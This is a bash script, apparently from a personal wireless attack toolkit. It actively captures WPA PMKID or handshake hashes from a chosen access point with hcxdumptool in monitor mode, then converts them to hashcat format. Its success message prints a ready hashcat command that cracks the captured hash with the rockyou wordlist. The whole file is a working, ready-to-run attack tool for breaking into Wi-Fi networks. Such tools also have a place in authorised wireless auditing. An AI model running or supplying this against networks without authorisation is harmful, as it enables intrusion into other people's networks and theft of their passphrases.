#!/bin/bash
# ACTIVE PMKID Capture with early exit - Uses hcxdumptool 7.x
# Usage: ./capture_pmkid_active.sh <BSSID> <CHANNEL> <SSID> [duration_in_seconds]

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./capture_pmkid_active.sh <BSSID> <CHANNEL> <SSID> [duration]"
    echo "Example: ./capture_pmkid_active.sh 30:68:93:AC:96:AD 6 hackme 120"
    exit 1
fi

BSSID=$1
CHANNEL=$2
SSID=$3
MAX_DURATION=${4:-120}
CHECK_INTERVAL=10
CAPTURE_DIR="/home/ov3rr1d3/wifi_arsenal/captures"
SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts"

# Sanitize SSID for filename
if [ -z "$SSID" ] || [ "$SSID" = "<hidden>" ]; then
    SSID="hidden"
fi
SAFE_SSID=$(echo "$SSID" | tr ' /:*?"<>|' '_')

# Generate timestamp
TIME_PART=$(date +%I-%M%p | tr 'A-Z' 'a-z')
DATE_PART=$(date +%m-%d-%Y)
TIMESTAMP="${TIME_PART}_${DATE_PART}"

OUTPUT_PREFIX="$CAPTURE_DIR/AP=${SAFE_SSID}_${TIMESTAMP}_orchestrator"

echo "[*] METHOD: ACTIVE PMKID (hcxdumptool 7.x) WITH EARLY EXIT"
echo "[*] Targeting: $BSSID on channel $CHANNEL"
echo "[*] Max duration: ${MAX_DURATION}s (exits early on success)"
echo "[*] Checking every ${CHECK_INTERVAL}s for PMKID"
echo ""

# Ensure alfa0 is in monitor mode
echo "[*] Setting alfa0 to monitor mode..."
$SCRIPT_DIR/mode_manager.sh ensure alfa0 monitor

if [ $? -ne 0 ]; then
    echo "[-] Failed to set monitor mode"
    exit 1
fi

# Determine band suffix (channel 1-14 = 2.4GHz = 'a', 36+ = 5GHz = 'b')
if [ "$CHANNEL" -le 14 ]; then
    CHANNEL_BAND="${CHANNEL}a"
else
    CHANNEL_BAND="${CHANNEL}b"
fi

echo "[*] Starting active PMKID capture on channel $CHANNEL_BAND..."
echo ""

# Run hcxdumptool in background (long timeout, we'll manage duration ourselves)
sudo hcxdumptool -i alfa0 \
    -w "${OUTPUT_PREFIX}.pcapng" \
    -c "$CHANNEL_BAND" \
    --tot=60 \
    --rds=2 \
    >/dev/null 2>&1 &

HCX_PID=$!

# Monitor and check periodically
START_TIME=$(date +%s)
CHECK_NUM=0

while true; do
    sleep $CHECK_INTERVAL
    CHECK_NUM=$((CHECK_NUM + 1))
    ELAPSED=$(($(date +%s) - START_TIME))
    
    echo "[*] Check $CHECK_NUM (${ELAPSED}s elapsed)..."
    
    # Check if hcxdumptool is still running
    if ! kill -0 $HCX_PID 2>/dev/null; then
        echo "[*] hcxdumptool finished"
        break
    fi
    
    # Check for capture file and try to convert
    if [ -f "${OUTPUT_PREFIX}.pcapng" ]; then
        if $SCRIPT_DIR/check_handshake.sh "${OUTPUT_PREFIX}.pcapng" "${OUTPUT_PREFIX}.hc22000"; then
            echo ""
            echo "[+] ✓ PMKID/HANDSHAKE CAPTURED at ${ELAPSED}s!"
            
            # Kill hcxdumptool
            sudo kill $HCX_PID 2>/dev/null
            wait $HCX_PID 2>/dev/null
            
            HASH_COUNT=$(wc -l < "${OUTPUT_PREFIX}.hc22000")
            echo "[+] SUCCESS: Hash file ready: ${OUTPUT_PREFIX}.hc22000"
            echo "[+] Hashes captured: $HASH_COUNT"
            echo ""
            echo "[*] To crack:"
            echo "    hashcat -m 22000 ${OUTPUT_PREFIX}.hc22000 /usr/share/wordlists/rockyou.txt"
            rm -f "${OUTPUT_PREFIX}.pcapng" 2>/dev/null
            exit 0
        fi
    fi

    # Check if we've exceeded max duration
    if [ $ELAPSED -ge $MAX_DURATION ]; then
        echo "[*] Max duration reached"
        break
    fi
    
    echo "[*] No PMKID yet, continuing..."
done

# Kill hcxdumptool if still running
if kill -0 $HCX_PID 2>/dev/null; then
    sudo kill $HCX_PID 2>/dev/null
    wait $HCX_PID 2>/dev/null
fi

# Final check
echo ""
echo "[*] Final check..."
if [ -f "${OUTPUT_PREFIX}.pcapng" ]; then
    if $SCRIPT_DIR/check_handshake.sh "${OUTPUT_PREFIX}.pcapng" "${OUTPUT_PREFIX}.hc22000"; then
        HASH_COUNT=$(wc -l < "${OUTPUT_PREFIX}.hc22000")
        echo "[+] SUCCESS: Hash file ready: ${OUTPUT_PREFIX}.hc22000"
        echo "[+] Hashes captured: $HASH_COUNT"
        echo ""
        echo "[*] To crack:"
        echo "    hashcat -m 22000 ${OUTPUT_PREFIX}.hc22000 /usr/share/wordlists/rockyou.txt"
        rm -f "${OUTPUT_PREFIX}.pcapng" 2>/dev/null
        exit 0
    fi
fi

echo "[-] FAILED: No valid PMKID/handshake captured"
echo "    Router may not support PMKID or has PMF enabled"
rm -f "${OUTPUT_PREFIX}.pcapng" 2>/dev/null
exit 1
